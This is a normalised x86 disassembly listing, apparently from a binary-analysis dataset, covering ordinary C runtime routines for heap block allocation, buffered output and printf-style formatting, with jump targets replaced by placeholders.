cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov esi [ edi + 0x8 ]
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
mov ebx 0x80000000
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
cmp edi 0x3f
lea ecx [ ecx + esi - 0x4 ]
jbe r-xdata
add ecx 0xffffffe0
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx esi
jmp r-xdata
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx 0x80000000
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
mov [ ebp + 0x13 ] cl
inc cl
cmp edi 0x20
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov ecx edi
jmp r-xdata
mov ecx edi
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
mov edx 0x80000000
shr edx cl
or [ eax ] edx
sub_4b94ca
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
mov edx [ rw-data ]
add ecx 0x17
and ecx 0xfffffff0
push ebx
mov [ ebp - 0x10 ] ecx
sar ecx 0x4
push esi
lea eax [ eax + eax * 4 ]
push edi
dec ecx
cmp ecx 0x20
lea edi [ edx + eax * 4 ]
mov [ ebp - 0x4 ] edi
jge r-xdata
add ecx 0xffffffe0
or eax 0xffffffff
xor esi esi
shr eax cl
mov [ ebp - 0x8 ] eax
or esi 0xffffffff
shr esi cl
or [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov eax [ rw-data ]
mov ebx eax
mov [ ebp - 0xc ] esi
cmp ebx edi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
mov [ rw-data ] ebx
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
cmp edx 0xffffffff
mov [ ebp - 0x4 ] edx
je r-xdata
mov ebx edx
jmp r-xdata
mov edx [ eax + 0xc4 ]
and edx [ ebp - 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ eax + 0x44 ]
mov esi [ ecx ]
and esi [ ebp - 0xc ]
or edx esi
mov esi [ ebp - 0xc ]
jne r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
mov edi [ eax + edx * 4 + 0x44 ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ ecx + 0x84 ]
and edx [ ebp - 0x8 ]
inc [ ebp - 0x4 ]
add ecx 0x4
mov edi [ ecx ]
and edi esi
or edx edi
je r-xdata
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ eax + edx * 4 + 0x44 ]
xor edi edi
and ecx esi
jne r-xdata
mov ecx [ ebx + 0x4 ]
mov edi [ ebx ]
and ecx [ ebp - 0x8 ]
and edi esi
or ecx edi
jne r-xdata
cmp ebx eax
je r-xdata
test ecx ecx
jge r-xdata
mov ecx [ eax + edx * 4 + 0xc4 ]
and ecx [ ebp - 0x8 ]
push 0x20
pop edi
jmp r-xdata
add ebx 0x14
cmp ebx [ ebp - 0x4 ]
jb r-xdata
shl ecx 0x1
inc edi
mov ecx [ ebp - 0xc ]
mov edx [ ecx + edi * 8 + 0x4 ]
mov ecx [ edx ]
sub ecx [ ebp - 0x10 ]
mov esi ecx
sar esi 0x4
dec esi
cmp esi 0x3f
mov [ ebp - 0x8 ] ecx
jle r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx [ ebp - 0x4 ]
jne r-xdata
cmp esi edi
je r-xdata
push 0x3f
pop esi
add ebx 0x14
mov [ ebp + 0x8 ] ebx
push ebx
call sub_4b90e5
pop ecx
mov ecx [ ebx + 0x10 ]
mov [ ecx ] eax
mov eax [ ebx + 0x10 ]
cmp [ eax ] 0xffffffff
jne r-xdata
mov ebx edx
jmp r-xdata
test ecx ecx
je r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp ebx eax
mov [ ebp + 0x8 ] ebx
jb r-xdata
mov esi [ ebp - 0x10 ]
add edx ecx
lea ecx [ esi + 0x1 ]
mov [ edx ] ecx
mov [ edx + esi - 0x4 ] ecx
mov esi [ ebp - 0xc ]
mov ecx [ esi ]
test ecx ecx
lea edi [ ecx + 0x1 ]
mov [ esi ] edi
jne r-xdata
mov [ edx ] ecx
mov [ ecx + edx - 0x4 ] ecx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
mov ecx [ edx + 0x8 ]
mov edi [ edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ edx + 0x4 ]
mov edi [ edx + 0x8 ]
mov [ ecx + 0x8 ] edi
je r-xdata
cmp edi 0x20
mov ebx 0x80000000
jge r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
cmp ebx eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
lea eax [ edx + 0x4 ]
cmp ebx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
lea ecx [ ecx + esi * 8 ]
mov edi [ ecx + 0x4 ]
mov [ edx + 0x8 ] ecx
mov [ edx + 0x4 ] edi
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
lea ecx [ edi - 0x20 ]
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx * 4 + 0xc4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
and [ ecx ] ebx
dec [ edi ]
mov [ ebp - 0x14 ] ebx
jne r-xdata
mov ecx edi
shr ebx cl
mov ecx [ ebp - 0x4 ]
lea edi [ eax + edi + 0x4 ]
not ebx
mov [ ebp - 0x14 ] ebx
and ebx [ eax + ecx * 4 + 0x44 ]
mov [ eax + ecx * 4 + 0x44 ] ebx
dec [ edi ]
jne r-xdata
add ebx 0x14
call sub_4b902e
mov ebx eax
test ebx ebx
mov [ ebp + 0x8 ] ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ rw-data ]
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov cl [ esi + eax + 0x4 ]
mov [ ebp + 0xb ] cl
inc cl
cmp esi 0x20
mov [ esi + eax + 0x4 ] cl
jge r-xdata
mov ebx [ ebp + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
and [ ebx + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx [ ebp + 0x8 ]
and [ ebx ] ecx
jmp r-xdata
and [ rw-data ] 0x0
cmp [ ebp + 0xb ] 0x0
jne r-xdata
cmp [ ebp + 0xb ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov ecx esi
mov edi 0x80000000
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_4b97c6
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
test al 0x82
mov ebx [ esi + 0x10 ]
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and eax 0xffffffef
or eax 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push ebx
call sub_4bbd0c
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_4bbdfb
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_4bbd0c
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_4bbdb7
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
mov eax ebx
and eax 0x1f
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
add esp 0xc
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_4bbabc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_4b98df
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_4b97c6
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_4b9912
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_4b98df
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_4b9936
test [ edi + 0xc ] 0x40
push ebx
push esi
mov esi eax
mov ebx ecx
je r-xdata
cmp [ esp + 0xc ] 0x0
jg r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov al [ ebx ]
dec [ esp + 0xc ]
mov ecx edi
call sub_4b98df
inc ebx
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebx
retn
mov eax [ esp + 0xc ]
add [ esi ] eax
jmp r-xdata
sub_4b996d
push ebp
mov ebp esp
sub esp 0x254
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp + 0xc ]
mov bl [ eax ]
xor ecx ecx
test bl bl
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
mov eax [ ebp - 0x18 ]
pop ebx
call sub_4bb8c9
leave
retn
push esi
push edi
mov edi eax
jmp r-xdata
inc edi
cmp [ ebp - 0x18 ] 0x0
mov [ ebp + 0xc ] edi
jl r-xdata
pop edi
pop esi
cmp bl 0x20
jl r-xdata
xor eax eax
cmp bl 0x78
jg r-xdata
mov edi [ ebp + 0xc ]
mov bl [ edi ]
test bl bl
jne r-xdata
jmp [ eax * 4 + jump_table_4ba0e2 ]
movsx eax bl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx [ ebp - 0x38 ]
xor eax eax
or [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x28 ] eax
jmp r-xdata
movsx eax bl
sub eax 0x20
je r-xdata
cmp bl 0x2a
jne r-xdata
and [ ebp - 0xc ] 0x0
jmp r-xdata
cmp bl 0x2a
jne r-xdata
cmp bl 0x49
je r-xdata
mov ecx [ rw-data ]
and [ ebp - 0x28 ] 0x0
movzx eax bl
test [ ecx + eax * 2 + 0x1 ] 0x80
je r-xdata
movsx eax bl
cmp eax 0x67
jg r-xdata
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
cmp eax ecx
mov [ ebp - 0x38 ] eax
ja r-xdata
or [ ebp - 0x8 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x24 ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x4
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
test eax eax
mov [ ebp - 0x24 ] eax
jge r-xdata
mov eax [ ebp - 0xc ]
movsx ecx bl
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 - 0x30 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
add [ ebp + 0x10 ] 0x4
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
test eax eax
mov [ ebp - 0xc ] eax
jge r-xdata
mov al [ edi ]
cmp al 0x36
jne r-xdata
cmp bl 0x68
je r-xdata
mov ecx [ ebp + 0x8 ]
lea esi [ ebp - 0x18 ]
mov al bl
call sub_4b98df
jmp r-xdata
mov ecx [ ebp + 0x8 ]
lea esi [ ebp - 0x18 ]
mov al bl
call sub_4b98df
mov bl [ edi ]
inc edi
mov [ ebp + 0xc ] edi
sub eax 0x69
je r-xdata
cmp eax 0x65
jge r-xdata
or [ ebp - 0x8 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x8 ] 0x4
neg [ ebp - 0x24 ]
jmp r-xdata
or [ ebp - 0xc ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x8 ] 0x20
jmp r-xdata
cmp bl 0x6c
je r-xdata
or [ ebp - 0x8 ] 0x40
sub eax 0x5
je r-xdata
or [ ebp - 0x8 ] 0x40
cmp [ ebp - 0xc ] 0x0
lea esi [ ebp - 0x254 ]
mov [ ebp - 0x10 ] esi
jge r-xdata
cmp eax 0x58
jg r-xdata
or [ ebp - 0x8 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ edi + 0x1 ] 0x32
jne r-xdata
inc edi
inc edi
or [ ebp - 0x7 ] 0x80
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x8 ] 0x10
jmp r-xdata
cmp bl 0x77
jne r-xdata
add [ ebp + 0x10 ] 0x4
test bl 0x20
mov eax [ ebp + 0x10 ]
je r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx ]
mov edx [ ecx + 0x4 ]
add ecx 0x8
mov [ ebp + 0x10 ] ecx
jmp r-xdata
add [ ebp + 0x10 ] 0x4
test [ ebp - 0x8 ] 0x20
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
je r-xdata
dec eax
je r-xdata
jne r-xdata
mov [ ebp - 0xc ] 0x6
jmp r-xdata
sub eax 0x5a
je r-xdata
je r-xdata
or [ ebp - 0x8 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
inc edi
inc edi
and [ ebp - 0x7 ] 0x7f
mov [ ebp + 0xc ] edi
jmp r-xdata
or [ ebp - 0x7 ] 0x8
jmp r-xdata
test bl 0x40
mov eax [ eax - 0x4 ]
jne r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov ecx [ ebp - 0x18 ]
mov [ eax ] ecx
mov cx [ ebp - 0x18 ]
mov [ eax ] cx
jmp r-xdata
test [ ebp - 0x8 ] 0x80
mov [ ebp - 0x14 ] 0x8
je r-xdata
dec eax
je r-xdata
mov eax 0x200
cmp [ ebp - 0xc ] eax
jle r-xdata
cmp bl 0x67
jne r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
push [ ebp - 0x3c ]
add eax 0x8
push [ ebp - 0xc ]
mov [ ebp + 0x10 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x48 ] eax
movsx eax bl
push eax
lea eax [ ebp - 0x4c ]
push esi
push eax
mov [ ebp - 0x4c ] ecx
call [ rw-data ]
mov edi [ ebp - 0x8 ]
add esp 0x14
and edi 0x80
je r-xdata
add [ ebp + 0x10 ] 0x4
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
test eax eax
je r-xdata
sub eax 0x9
je r-xdata
mov [ ebp - 0x30 ] ecx
sub eax 0x43
je r-xdata
or [ ebp - 0x8 ] 0x8
jmp r-xdata
cmp al 0x6f
je r-xdata
cdq
jmp r-xdata
xor edx edx
movzx eax [ eax - 0x4 ]
jmp r-xdata
movsx eax [ eax - 0x4 ]
test [ ebp - 0x8 ] esi
mov ebx eax
mov edi edx
jne r-xdata
test edx edx
jg r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov [ ebp - 0x34 ] 0x1
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov esi 0x8000
test esi ebx
je r-xdata
or [ ebp - 0x7 ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0x8
sub eax 0x3
je r-xdata
mov edi 0xa3
cmp [ ebp - 0xc ] edi
jle r-xdata
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp bl 0x67
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
push eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
add [ ebp + 0x10 ] 0x4
test [ ebp - 0x8 ] 0x810
mov eax [ ebp + 0x10 ]
je r-xdata
dec eax
jne r-xdata
mov al [ ebp - 0x30 ]
add al 0x51
mov [ ebp - 0x1c ] 0x30
mov [ ebp - 0x1b ] al
mov [ ebp - 0x20 ] 0x2
jmp r-xdata
test [ ebp - 0x8 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
push [ ebp - 0x2c ]
call sub_4b66ed
and [ ebp - 0x2c ] 0x0
pop ecx
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov eax [ ebp - 0xc ]
add eax 0x15d
push eax
call sub_4b66db
test eax eax
pop ecx
mov [ ebp - 0x2c ] eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
push esi
call [ rw-data ]
pop ecx
call sub_4b6ec0
pop ecx
jmp r-xdata
test [ ebp - 0x7 ] 0x8
movsx eax [ eax ]
mov [ ebp - 0x10 ] ecx
je r-xdata
mov al [ eax - 0x4 ]
mov [ ebp - 0x254 ] al
mov [ ebp - 0x14 ] 0x1
movsx eax [ eax - 0x4 ]
push eax
lea eax [ ebp - 0x254 ]
push eax
call sub_4bbfe6
test eax eax
pop ecx
pop ecx
mov [ ebp - 0x14 ] eax
jge r-xdata
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
or [ ebp - 0x7 ] 0x8
mov [ ebp - 0x3c ] 0x1
add bl 0x20
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
and [ ebp - 0x8 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0xc ] eax
jle r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x7 ] 0x1
test eax eax
jae r-xdata
add [ ebp + 0x10 ] 0x4
test [ ebp - 0x8 ] 0x810
mov eax [ ebp + 0x10 ]
mov eax [ eax - 0x4 ]
mov [ ebp - 0x10 ] eax
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x14 ] 0xa
sub eax 0x3
jne r-xdata
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] eax
mov esi eax
jmp r-xdata
push esi
or [ ebp - 0x7 ] 0x1
inc esi
mov [ ebp - 0x10 ] esi
push esi
call [ rw-data ]
pop ecx
mov [ ebp - 0x14 ] eax
and [ ebp - 0x28 ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
lea eax [ ebp - 0x254 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov [ ebp - 0x34 ] 0x1
jmp r-xdata
mov ebx [ ebp - 0x8 ]
test bl 0x40
je r-xdata
sub eax 0xc
jne r-xdata
cmp al 0x58
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0xc ] eax
test eax eax
jne r-xdata
test eax eax
jne r-xdata
mov [ ebp - 0x30 ] 0x27
jmp r-xdata
mov esi [ ebp - 0x24 ]
sub esi [ ebp - 0x20 ]
sub esi [ ebp - 0x14 ]
test bl 0xc
jne r-xdata
test bh 0x1
je r-xdata
test [ ebp - 0x8 ] 0x830
jne r-xdata
and [ ebp - 0x38 ] 0x0
lea esi [ ebp - 0x55 ]
and [ ebp - 0x20 ] 0x0
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x10 ] eax
test [ ebp - 0x8 ] 0x80
mov [ ebp - 0x14 ] 0x10
je r-xdata
push [ ebp - 0x20 ]
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x1c ]
call sub_4b9936
test bl 0x8
pop ecx
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push esi
push 0x20
call sub_4b9912
add esp 0xc
test bl 0x1
je r-xdata
mov [ ebp - 0x1c ] 0x2d
jmp r-xdata
or [ ebp - 0x7 ] 0x8
mov eax [ ebp - 0x14 ]
cdq
push edx
push eax
push edi
push ebx
call sub_4bc010
add ecx 0x30
cmp ecx 0x39
mov [ ebp - 0x40 ] ebx
mov ebx eax
mov edi edx
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x1c ] 0x2b
jmp r-xdata
mov [ ebp - 0x20 ] 0x1
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x30 ]
lea eax [ ebp - 0x55 ]
sub eax esi
inc esi
test [ ebp - 0x7 ] 0x2
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] esi
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x10 ]
jmp r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x10 ]
sar eax 0x1
jmp r-xdata
push [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x18 ]
call sub_4b9936
pop ecx
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
push edi
push esi
push 0x30
lea eax [ ebp - 0x18 ]
call sub_4b9912
add esp 0xc
mov [ ebp - 0x1c ] 0x20
mov eax [ ebp - 0xc ]
dec [ ebp - 0xc ]
test eax eax
jg r-xdata
mov ecx esi
cmp [ ecx ] 0x30
jne r-xdata
inc eax
inc eax
inc eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x18 ]
push esi
push 0x20
call sub_4b9912
add esp 0xc
mov eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
mov [ ebp - 0x40 ] eax
dec [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
mov [ ecx ] 0x30
inc eax
test eax eax
jne r-xdata
test [ ebp - 0x8 ] 0x4
je r-xdata
mov edi [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
lea ecx [ ebp - 0x54 ]
call sub_4b9936
cmp [ ebp - 0x40 ] 0x0
pop ecx
jne r-xdata
dec [ ebp - 0x40 ]
xor eax eax
mov ax [ ebx ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call sub_4bbfe6
inc ebx
pop ecx
inc ebx
test eax eax
pop ecx
jle r-xdata
jmp r-xdata
sub_4ba102
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
cmp ecx 0x100
mov ecx [ ebp + 0x8 ]
ja r-xdata
push esi
mov edx eax
sar edx 0x8
push edi
mov edi [ ecx + 0x48 ]
movzx esi dl
test [ edi + esi * 2 + 0x1 ] 0x80
pop edi
pop esi
je r-xdata
mov ecx [ ecx + 0x48 ]
movzx eax [ ecx + eax * 2 ]
jmp r-xdata
and [ ebp - 0x3 ] 0x0
mov [ ebp - 0x4 ] al
xor eax eax
inc eax
and [ ebp - 0x2 ] 0x0
push 0x2
mov [ ebp - 0x3 ] al
mov [ ebp - 0x4 ] dl
pop eax
jmp r-xdata
and eax [ ebp + 0x10 ]
leave
retn
movzx eax [ ebp + 0xe ]
leave
retn
push 0x1
push [ ecx + 0x14 ]
push [ ecx + 0x4 ]
lea ecx [ ebp + 0xe ]
push ecx
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1
call sub_4bc0a5
add esp 0x1c
test eax eax
jne r-xdata
sub_4ba179
push esi
mov esi [ esp + 0x8 ]
mov eax [ esi + 0x3c ]
push edi
xor edi edi
cmp eax [ rw-data ]
je r-xdata
mov eax [ esi + 0x40 ]
cmp eax [ rw-data ]
je r-xdata
cmp eax edi
je r-xdata
mov eax [ esi + 0x50 ]
cmp eax [ rw-data ]
je r-xdata
cmp eax edi
je r-xdata
mov eax [ esi + 0x2c ]
cmp [ eax ] edi
jne r-xdata
push esi
call sub_4b66ed
pop ecx
pop edi
pop esi
retn
cmp eax edi
je r-xdata
cmp [ eax ] edi
